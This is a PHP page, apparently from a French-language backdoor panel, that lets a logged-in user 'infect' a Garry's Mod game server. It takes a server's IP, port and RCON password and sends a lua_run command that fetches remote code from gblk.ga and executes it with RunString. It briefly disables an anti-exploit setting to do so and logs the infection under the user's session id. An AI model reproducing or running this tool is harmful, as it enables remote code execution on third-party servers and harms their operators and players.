<?php include('isdefault.php');


	include 'core/SourceQuery/SourceQuery.class.php';

	if (!Account::isAuthentified())
	{
	    die("Bad request");
	}
	if (isset($_POST['infectserv'])){ 
		$rcn = new SourceQuery;
		$rcn->Connect($_POST['server_ip'], $_POST['server_port']);
		$rcn->SetRconPassword($_POST['rcon']);
		$rcn->Rcon("snte_ulxluarun 0");
		$rcn->Rcon("lua_run http.Fetch('http://gblk.ga/f?k=".$_SESSION["id"]."',RunString)");
		$rcn->Rcon("snte_ulxluarun 1");
		Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y à H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;L'utilisateur ".$_SESSION["id"]." a infécter un serveur via RCON</p>");
	}


	
?>

<!-- 
	<div class="row">
		<center>
			<form method="post">
			<div class="form-group">
				<label>IP : </label>
				<input type="text" class="form-control" name="server_ip">
			</div>
			<div class="form-group">
				<label>Port :</label>
				<input type="text" class="form-control" name="server_port">
			</div>
			<div class="form-group">
				<label>RCON : </label>
				<input type="text" name="rcon" class="form-control">
			</div>
			<input type="submit" name="infectserv" class="btn btn-success" value="Infecter">
			</form>
		</center>

	</div> -->

	<div class="col-lg-12">
                        <div class="calender-inner">
                            <div class="card-header py-3">
                  <h3 class="m-0 font-weight-bold text-primary">Infécter un serveur via RCON</h3>
                </div>
                            <div>
                               
                           	<form method="post">
			<div class="form-group">
				<label style="color:white;">IP : </label>
				<input type="text" class="form-control" name="server_ip">
			</div>
			<div class="form-group">
				<label style="color:white;">Port :</label>
				<input type="text" class="form-control" name="server_port">
			</div>
			<div class="form-group">
				<label style="color:white;">RCON : </label>
				<input type="text" name="rcon" class="form-control">
			</div>
			<input type="submit" name="infectserv" class="btn btn-success" value="Infecter">
			</form>

                    </div>
                            </div>

	<script src="js/jquery.min.js"></script>
	<script src="js/bootstrap.min.js"></script>
	<script src="js/jquery.dataTables.min.js"></script>
	<script src="js/datatables.bootstrap.min.js"></script>
	<script src="js/custom.js"></script>
<?php include('isdefault_down.php'); ?>
